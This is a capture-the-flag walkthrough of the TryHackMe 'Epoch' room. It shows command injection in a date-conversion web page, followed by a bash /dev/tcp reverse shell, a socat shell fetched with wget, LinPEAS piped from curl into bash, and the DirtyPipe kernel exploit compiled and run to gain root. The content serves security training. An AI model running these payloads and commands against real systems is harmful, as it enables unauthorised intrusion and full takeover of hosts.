# Epoch

## Introduction

Welcome to my another writeup! In this TryHackMe [Epoch](https://tryhackme.com/room/epoch) room, you'll learn: Inspecting malicious traffics in Brim and more! Without further ado, let's dive in.

- Overall difficulty for me: Very easy

## Background

> Be honest, you have always wanted an online tool that could help you convert UNIX dates and timestamps!

> Difficulty: Easy

Be honest, you have _always_ wanted an online tool that could help you convert UNIX dates and timestamps! Wait... it doesn't need to be online, you say? Are you telling me there is a command-line Linux program that can already do the same thing? Well, of course, we already knew that! Our website actually just passes your input right along to that command-line program!

**Access this challenge** by deploying both the vulnerable machine by pressing the green "Start Machine" button located within this task, and the TryHackMe AttackBox by pressing the "Start AttackBox" button located at the top-right of the page.

Navigate to the following URL using the AttackBox: [http://MACHINE_IP](http://MACHINE_IP)

## Service Enumeration

### HTTP on Port 80

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Epoch/images/Pasted%20image%2020221101234154.png)

**Looks like what this page does is converting Unix epoch time to UTC time!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Epoch/images/Pasted%20image%2020221101234252.png)

**What if I type an invalid epoch time??**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Epoch/images/Pasted%20image%2020221101234405.png)

Hmm... `exit status 1`.

**This looks like it's vulnerable to command injection!** (`exit status 1` is the exit status in Unix system.)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Epoch/images/Pasted%20image%2020221101234752.png)

It's indeed vulnerable!

**Also, look at the error of the `date` command:**
`date: invalid date '@'`

**This looks like our input is being parse to a bash command, like: `bash -c "date <user_input>"`.**

## Initial Foothold

**In here, you can type `env` to get the flag. Or get a reverse shell!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Epoch/images/Pasted%20image%2020221101235049.png)

- Reverse shell:

**Payload:** (Generated from [revshells.com](https://www.revshells.com/))
```bash
/bin/bash -i >& /dev/tcp/10.9.0.253/443 0>&1
```

**Setup a `nc` listener:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Epoch]
└─# nc -lnvp 443 
listening on [any] 443 ...
```

**Send the payload:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Epoch/images/Pasted%20image%2020221101235255.png)

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Epoch]
└─# nc -lnvp 443 
listening on [any] 443 ...
connect to [10.9.0.253] from (UNKNOWN) [10.10.16.249] 55158
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
challenge@e7c1352e71ec:~$ whoami;hostname;id
whoami;hostname;id;ip a
challenge
e7c1352e71ec
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
```

**Flag:**
```
challenge@e7c1352e71ec:~$ env
HOSTNAME=e7c1352e71ec
PWD=/home/challenge
HOME=/home/challenge
LS_COLORS=
GOLANG_VERSION=1.15.7
FLAG=flag{Redacted}
SHLVL=2
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
```

## Privilege Escalation (Optional)

**Stable shell via `socat`:**
```
┌──(root🌸siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80           
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

challenge@e7c1352e71ec:~$ wget http://10.9.0.253/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

┌──(root🌸siunam)-[~/ctf/thm/ctf/Epoch]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2022/11/01 23:57:17 socat[14829] N opening character device "/dev/pts/2" for reading and writing
2022/11/01 23:57:17 socat[14829] N listening on AF=2 0.0.0.0:4444
                                                                 2022/11/01 23:57:19 socat[14829] N accepting connection from AF=2 10.10.16.249:54494 on AF=2 10.9.0.253:4444
                                                                  2022/11/01 23:57:19 socat[14829] N starting data transfer loop with FDs [5,5] and [7,7]
                                              challenge@e7c1352e71ec:~$ 
challenge@e7c1352e71ec:~$ stty rows 23 columns 107
challenge@e7c1352e71ec:~$ export TERM=xterm-256color
challenge@e7c1352e71ec:~$ ^C
challenge@e7c1352e71ec:~$ 
```

**LinPEAS:**
```
┌──(root🌸siunam)-[/opt/PEAS]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

challenge@e7c1352e71ec:~$ curl -s http://10.9.0.253/linpeas.sh | bash
[...]
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-3560

Vulnerable to CVE-2022-0847
[...]
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: [ ubuntu=(20.04|21.04) ],debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded
[...]
```

**Hmm... Let's try the DirtyPipe kernel exploit:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Epoch]
└─# wget https://haxx.in/files/dirtypipez.c

challenge@e7c1352e71ec:~$ wget http://10.9.0.253/dirtypipez.c -O /tmp/dirtypipez.c;cd /tmp
```

**Confirm the target machine has `gcc` installed:**
```
challenge@e7c1352e71ec:/tmp$ which gcc
/usr/bin/gcc
```

**It's has `gcc`, so we can compile the C exploit in there.**

**Compile the C exploit:**
```
challenge@e7c1352e71ec:/tmp$ gcc dirtypipez.c -o dirtypipez

challenge@e7c1352e71ec:/tmp$ ./dirtypipez 
Usage: ./dirtypipez SUID
```

**In this kernel exploit, it needs a SUID sticky bit binary!**
```
challenge@e7c1352e71ec:/tmp$ find / -perm -4000 2>/dev/null
/usr/bin/chfn
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/su
/usr/bin/mount
```

**Let's use the `/usr/bin/chfn` as the binary that we want to hijack:**
```
challenge@e7c1352e71ec:/tmp$ ./dirtypipez /usr/bin/chfn
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# whoami;hostname;id
root
e7c1352e71ec
uid=0(root) gid=0(root) groups=0(root)
```

I'm root! :D

# Conclusion

What we've learned:

1. Command Injection
2. Privilege Escalation via DirtyPipe (CVE-2022-0847) Kernel Exploit